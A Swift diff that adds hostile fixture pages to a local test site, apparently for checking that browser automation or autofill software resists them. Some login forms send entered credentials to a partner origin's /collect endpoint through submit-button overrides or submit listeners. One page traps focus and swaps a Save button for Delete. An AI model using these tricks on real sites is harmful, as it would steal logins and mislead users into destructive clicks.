@@ -25,6 +25,11 @@ public final class FixtureSite: @unchecked Sendable {
         case webSockets                        // opens WebSockets to this and another origin
         case serviceWorker                     // registers a service worker
         case workerAndBeacon                   // dedicated worker, beacon, fetch and EventSource elsewhere
+        // The form itself is eligible, but its submit button, or a submit listener, sends it elsewhere.
+        case submitterOverridesToPartner       // formaction/formmethod: GET to the partner origin
+        case submitterTargetsFrame             // formtarget into a frame, formaction to the partner origin
+        case submitListenerRedirectsToPartner  // submit listener rewrites action and method
+        case submitListenerTargetsFrame        // submit listener retargets into a partner frame
     }
 
     public enum Profile: Sendable {
@@ -120,19 +125,71 @@ public final class FixtureSite: @unchecked Sendable {
             return FixtureResponse(status: 200, headers: ["Content-Type": "text/javascript"],
                                    body: Data("fetch('\(elsewhereOrigin)/from-worker').catch(() => {})".utf8))
         case ("GET", "/script.js"): return FixtureResponse(status: 200, headers: ["Content-Type": "text/javascript"], body: Data("window.__fixtureScript=1".utf8))
+        case ("GET", "/oops"): return .html("<!doctype html><html><head><title>Error</title></head><body><h1>Something went wrong</h1></body></html>", status: 500)
+        case ("GET", "/focus-trap"): return focusTrap()
+        case ("GET", "/huge"): return huge()
+        case ("GET", "/churn"): return page(body: "<script>location.reload()</script><p>churning</p>")
+        case ("GET", "/commit-leave"):
+            return page(body: "<h1>Commit</h1><form action=\"/commit-leave\" method=\"post\"><input type=\"text\" name=\"note\" aria-label=\"Note\" value=\"left\"><button type=\"submit\">Save and leave</button></form>")
+        case ("POST", "/commit-leave"):
+            let form = Self.formFields(request.body)
+            lock.withLock { _notes.append(form["note"] ?? "") }
+            return .redirect(to: elsewhereOrigin + "/after-commit")
         default: return FixtureResponse(status: 404)
         }
     }
 
-    private func loginForm(action: String = "/session", extra: String = "") -> String {
+    private func loginForm(action: String = "/session", extra: String = "",
+                           submit: String = "<input type=\"submit\" name=\"commit\" value=\"Sign in\">") -> String {
         """
         <form action="\(action)" method="post">
         <input type="text" id="login_field" name="login">
         <input type="password" id="password" name="password">
         \(extra)
-        <input type="submit" name="commit" value="Sign in">
+        \(submit)
         </form>
         """
+    }
+
+    /// Hostile timing: focusing "Search" moves focus to a password field 50 ms later, and the first
+    /// scroll replaces the "Save" button with a "Delete" button in the same place 50 ms later.
+    private func focusTrap() -> FixtureResponse {
+        page(body: """
+            <h1>Focus trap</h1><p id="status">idle</p>
+            <input type="text" id="search" aria-label="Search"><input type="password" id="secret" aria-label="Secret">
+            <div style="height: 3000px"></div>
+            <button type="button" id="save" aria-label="Save" style="width: 200px; height: 40px">Save</button>
+            <div style="height: 3000px"></div>
+            <script>
+            const status = (text) => { document.getElementById('status').textContent = text; };
+            document.getElementById('search').addEventListener('focus', () =>
+                setTimeout(() => document.getElementById('secret').focus(), 50));
+            document.getElementById('secret').addEventListener('input', () => status('secret field received input'));
+            document.getElementById('save').addEventListener('click', () => status('save clicked'));
+            addEventListener('scroll', () => setTimeout(() => {
+                const other = document.createElement('button');
+                other.type = 'button'; other.textContent = 'Delete'; other.setAttribute('aria-label', 'Delete');
+                other.style.cssText = 'width: 200px; height: 40px';
+                other.addEventListener('click', () => status('delete clicked'));
+                document.getElementById('save').replaceWith(other);
+            }, 50), { once: true });
+            </script>
+            """)
+    }
+
+    /// 256 selects of 256 options of 256 characters: more than 16 MiB of option text.
+    private func huge() -> FixtureResponse {
+        page(body: """
+            <h1>Huge</h1><div id="all"></div><script>
+            const text = 'x'.repeat(256), all = document.getElementById('all');
+            for (let i = 0; i < 256; i++) {
+                const select = document.createElement('select');
+                select.setAttribute('aria-label', 'Select ' + i);
+                for (let j = 0; j < 256; j++) { const option = document.createElement('option'); option.text = text; select.add(option); }
+                all.appendChild(select);
+            }
+            </script>
+            """)
     }
 
     private func page(head: String = "", body: String) -> FixtureResponse {
@@ -169,6 +226,14 @@ public final class FixtureSite: @unchecked Sendable {
             return page(body: loginForm() + "<script>for (const u of ['\(other)/sock', '\(same)/sock']) { try { new WebSocket(u) } catch (e) {} }</script>")
         case .serviceWorker:
             return page(body: loginForm() + "<script>navigator.serviceWorker && navigator.serviceWorker.register('/sw.js').catch(() => {})</script>")
+        case .submitterOverridesToPartner:
+            return page(body: loginForm(submit: "<input type=\"submit\" name=\"commit\" value=\"Sign in\" formaction=\"\(partnerOrigin)/collect\" formmethod=\"get\">"))
+        case .submitterTargetsFrame:
+            return page(body: "<iframe name=\"sink\"></iframe>" + loginForm(submit: "<input type=\"submit\" name=\"commit\" value=\"Sign in\" formaction=\"\(partnerOrigin)/collect\" formmethod=\"get\" formtarget=\"sink\">"))
+        case .submitListenerRedirectsToPartner:
+            return page(body: loginForm() + "<script>document.forms[0].addEventListener('submit', (e) => { e.target.action = '\(partnerOrigin)/collect'; e.target.method = 'get' })</script>")
+        case .submitListenerTargetsFrame:
+            return page(body: "<iframe name=\"sink\"></iframe>" + loginForm() + "<script>document.forms[0].addEventListener('submit', (e) => { e.target.action = '\(partnerOrigin)/collect'; e.target.method = 'get'; e.target.target = 'sink' })</script>")
         case .workerAndBeacon:
             return page(body: loginForm() + """
                 <script>try { new Worker('/worker.js') } catch (e) {}
@@ -189,6 +254,7 @@ public final class FixtureSite: @unchecked Sendable {
         switch login {
         case "mfa-user": target = "/mfa"
         case "captcha-user": target = "/captcha"
+        case "error-user": target = "/oops"
         default: target = "/home"
         }
         return .redirect(to: target, headers: ["Set-Cookie": "sid=\(token); Path=/; HttpOnly"])
